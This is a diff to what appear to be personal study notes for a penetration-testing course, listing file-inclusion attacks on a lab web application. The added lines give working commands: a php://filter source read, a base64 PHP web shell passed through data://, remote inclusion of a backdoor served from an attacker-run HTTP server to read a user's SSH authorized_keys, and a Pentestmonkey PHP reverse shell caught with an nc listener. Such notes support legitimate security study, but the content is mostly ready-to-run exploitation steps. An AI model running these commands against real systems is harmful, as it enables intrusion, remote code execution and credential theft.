@@ -634,9 +634,22 @@
     `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
   - windows LFI + Log poisoning C:\xampp\apache\logs\
     `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt `
-
 - 9.2.2 PHP Wrappers
+  - LFI php://filter to include content of /var/www/html/backup.php
+    `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`
+  - LFI data:// PHP to execute uname -a
+    base64: echo -n '<?php echo system($_GET["cmd"]);?>'
+    `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
 - 9.2.3 Remote File inclusion (RFI)
+  - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**
+    cd /usr/share/webshells/php/  `python3 -m http.server 80`
+    `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.221/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"`
+  - RFI to include **PHP reverse shell** from Pentestmonkey's GitHub + change the IP to kali + port 4444 + exploit port 8001
+    1. download reverse_shell from https://github.com/pentestmonkey/php-reverse-shell
+    2. change kali ip and port 4444 in .php
+    3. python3 -m http.server 80
+    4. nc -nvlp 4444
+    5. `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`  
 - 9.3.1 Using executable files
 - 9.3.2 Using non executable files
 - 9.4.1 OS Command injection
